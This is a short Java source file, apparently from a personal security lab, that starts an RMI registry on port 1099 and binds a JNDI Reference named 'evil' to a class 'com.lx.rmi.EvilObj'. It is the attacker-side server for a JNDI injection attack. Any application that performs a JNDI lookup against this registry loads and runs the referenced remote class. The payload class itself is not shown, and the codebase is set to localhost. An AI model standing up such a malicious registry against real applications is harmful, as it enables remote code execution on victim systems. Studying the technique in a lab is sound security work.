package com.lx.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @Author: Xin Liu
 * @Date: 2022/2/15
 */
public class RMIServer {
    public static void main(String[] args) {
        try{
            Registry registry = LocateRegistry.createRegistry(1099);

            System.out.println("Create RMI Registry on port 1099");
            String url="localhost";
            Reference reference = new Reference("com.lx.rmi.EvilObj", "com.lx.rmi.EvilObj",url);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil",referenceWrapper);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}